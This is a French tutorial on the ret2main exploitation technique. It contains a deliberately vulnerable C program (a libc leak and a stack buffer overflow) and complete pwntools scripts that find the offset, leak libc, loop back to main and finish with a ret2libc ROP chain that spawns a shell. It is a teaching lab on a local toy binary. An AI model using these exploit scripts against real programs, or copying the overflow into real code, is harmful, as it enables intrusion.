#### Ret2main

Protections mises en place pour cette démonstration :

* checksec --file=./exploit
  [*] '/root/Memory_Exploitation/exploit'
  Arch:       amd64-64-little
  RELRO:      Partial RELRO
  Stack:      No canary found
  NX:         NX enabled
  PIE:        No PIE (0x400000)
  Stripped:   No
  ASLR: enabled

Tout en continuant sur les exploitations "ret2", nous allons maintenant parler d'une technique un peu moins connue mais tout aussi utile et efficace dans le cas d'un programme à choix restreints. Si le binaire que nous voulons exploiter possédait par exemple plusieurs modes possibles d'exploitations mais qu'après l'utilisation de l'un d'entre eux, le programme se fermait alors à cause de l'ASLR, celui-ci ne pourrait pas nous permettre d'exploiter de potentiels leaks puis de les réutiliser à la prochaine exécution, c'est à ce moment-là que le ret2main entre en jeu. Le ret2main est donc une technique permettant de resauter sur la fonction main une fois celle-ci terminée, nous créeons donc une boucle infinie qui nous permet de ne jamais quitter le programme avec la fin de l'exécution d'un de ses modes. Ainsi si un mode nous permet le leak d'une adresse importante, alors celle-ci pourra toujours être utilisée car le programme ne sera jamais cloturé.

Voici le code vulnérable qui sera exploité :

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void vulnerable_function() {
    char buffer[64];
    printf("Entrée : ");
    read(0, buffer, 256);
}

void leak() {
    FILE *fd = fopen("/proc/self/maps", "r");
    char line[512];

    while(fgets(line, sizeof(line), fd)) {
        if(strstr(line, "libc.so.6") || strstr(line, "libc-")) {
            printf("Leak de la libc : %s", line);
            break;
        }
    }
}

int main() {
    int choice;
    setup();

    puts("1. Leak Libc");
    puts("2. Ecriture dans le buffer");
    printf("> ");

    if (scanf("%d", &choice) != 1) {
        return 1;
    }
    getchar();

    if (choice == 1) {
        leak();
    } else if (choice == 2) {
        vulnerable_function();
    }

    return 0;
}


```

Ce code possède donc deux vulnérabilités majeures :

* un Leak de l'adresse de base de la libc
* un stack buffer overflow dans le buffer de la fonction vulnerable_function()

Comme mentionné précédemment, nous ne pouvons exécuter qu'une seule fonction par lancement du programme, nous ne pouvons donc pas lancer le premier mode pour leaker la libc, puis lancer le deuxième mode pour écrire dans le buffer. Ainsi notre plan d'attaque va se dérouler comme-ci :

* Effectuer une première exploitation du stack buffer overflow afin d'exécuter la fonction leak() et retourner sur main afin d'empêcher le programme de se fermer et de réexécuter la fonction main()
* Calculer l'adresse de la fonction system() et la string "/bin/sh"
* Effectuer une deuxième exploitation du stack buffer overflow afin de cette fois-ci ret2libc et obtenir un shell

Tout d'abord il nous faut donc l'offset du registre RIP afin de pouvoir contrôler le programme, nous allons donc encore une fois exploiter le programme de recherche d'offset via cyclic(), voici un rappel du programme :

```
from pwn import *
import os

# On définit le binaire
exe = context.binary = ELF('./exploit')

# On lance le processus
p = process(exe.path)

# On envoie "2" pour choisir le mode d'écriture dans le buffer
p.sendline(b"2")

# On envoie un pattern cyclique long (128 octets)
p.sendline(cyclic(128))

# On attend que le processus crash
p.wait()

# On récupère le corefile généré en mémoire
core = p.corefile

# On cherche la valeur qui était dans RSP au moment du crash (en x64)
# car RIP a essayé de sauter sur cette valeur depuis la pile
stack_value = core.read(core.rsp, 8)
offset = cyclic_find(stack_value)

print(f"L'offset exact est : {offset}")

# On supprime le fichier temporaire crée par pwntools au moment du crash
os.remove(core.file.name)

p.close()
```

Une fois ce programme exécuté sur notre binaire nous obtenons donc un offset pour contrôler RIP de 72 octets.

Nous allons maintenant écraser l'adresse de retour avec l'adresse de la fonction leak() puis nous retournerons sur la fonction main() via son adresse, nous allons ainsi commencer par récupérer les adresses et offsets dont nous avons besoin :

* adresse de la fonction leak() via la commande : nm exploit | grep leak --> 000000000040121e
* adresse de la fonction main() via la commande : nm exploit | grep main --> 00000000004012c5
* offset de la fonction system() dans la libc via la commande : readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system --> 0000000000053110
* offset de la string "/bin/sh" via la commande : strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh" --> 1a7ea4

Une fois ces informations récupérées, il nous faut donc exécuter la fonction leak() et retourner sur main(), nous envoyons donc 72 octets de "junk", suivi de l'adresse de leak() écrasant l'adresse de retour puis l'adresse de main() pour retourner sur celle-ci. Nous obtenons ainsi ce résultat :

```

[*] Switching to interactive mode

2. Ecriture dans le buffer
> Entrée : Leak de la libc : 7646e705c000-7646e7084000 r--p 00000000 08:30 39030                      /usr/lib/x86_64-linux-gnu/libc.so.6

```

Nous pouvons donc voir que nous utilisons une première fois le mode "2" pour écrire dans le buffer, nous écrasons l'adresse de retour avec celle de leak() puis retournons sur la fonction main(), ainsi la fonction leak() nous affche bien le leak puis la fonction main() redémarre et le programme nous demande à nouveau le mode à choisir. Nous n'avons donc pas quitté le programme ainsi nous n'avons pas à nous soucier de l'ASLR sur la libc et system("/bin/sh").

Nous pouvons donc maintenant calculer system() ainsi que "/bin/sh"  pour les utiliser afin de ret2libc.

Cependant, le fait d'avoir mentionné la technique ret2libc devrait nous rappeler quelque chose, nous sommes en ELF x64, ainsi un ret2libc ne marchera pas simplement avec system("/bin/sh"), il nous faut aussi  un gadget de retour pour l'alignement et un gadget "pop rdi" afin de placer "/bin/sh" dans le registre RDI qui est le premier argument de la fonction system(). Encore une fois, nous pouvons récupérer toutes ces informations via le module intégré de pwntools appelé ROP().

une fois toutes les informations récupérées il ne reste plus qu'à exploiter les failles mentionnées ainsi que la technique du ret2main pour obtenir notre shell :

```
from pwn import *

exe = ELF('./exploit', checksec=False)
context.binary = exe

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(exe.path)

leak_addr = exe.symbols['leak']
main_addr = exe.symbols['main']

p.sendline(b"2")

ret2main = b"A" * 72
ret2main += p64(leak_addr)
ret2main += p64(main_addr)

p.sendline(ret2main)

p.recvuntil(b'Leak de la libc : ')
leak = p.recvline().decode()
libc_base = int(leak.split('-')[0], 16)
libc.address = libc_base
print(f"L'adresse de la libc est : {hex(libc_base)}")

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

p.sendline(b"2")

shell = b"A" * 72
shell += p64(ret_gadget)
shell += p64(pop_rdi)
shell += p64(binsh_addr)
shell += p64(system_addr)

p.sendline(shell)

p.interactive()
```

Nous obtenons ainsi notre shell en ayant exploité une technique permettant de retourner au début de main indéfiniment. Ainsi si nous avions plusieurs fonctions à utiliser nous aurions pu utiliser le ret2main autant de fois que nous en aurions eu besoin.
